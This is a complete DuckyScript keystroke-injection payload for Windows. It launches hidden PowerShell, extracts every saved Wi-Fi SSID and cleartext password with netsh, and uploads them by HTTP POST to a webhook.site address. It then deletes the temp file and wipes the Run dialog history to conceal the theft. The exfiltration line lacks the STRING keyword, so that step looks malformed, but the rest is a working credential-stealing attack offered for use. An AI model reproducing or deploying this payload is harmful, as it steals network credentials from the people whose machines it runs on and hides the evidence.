REM FAST WI-FI DATA EXFIL + DELETE HISTORY (POWERSHELL)

DELAY 3000
GUI r
DELAY 300
STRING powershell -w h -ep bypass "function w{switch -r(netsh wl sh pr){':\s(.+)'{$s=$matches.1;switch -r(netsh wl sh pr n=$s k=clear){'tent.+:\s(.+)'{[PSCustomObject]@{SSID=$s;Pass=$matches.1}}}}}};$w=w;echo $w > $env:tmp\Wi-Fi-PASS"
ENTER
DELAY 100
Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile $env:tmp\Wi-Fi-PASS ; Remove-Item Wi-Fi-PASS -Force -ErrorAction SilentlyContinue ; Remove-ItemProperty -Path ‘HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’ -Name ‘*’ -ErrorAction SilentlyContinue ; exit
ENTER
DELAY 1000
EXIT
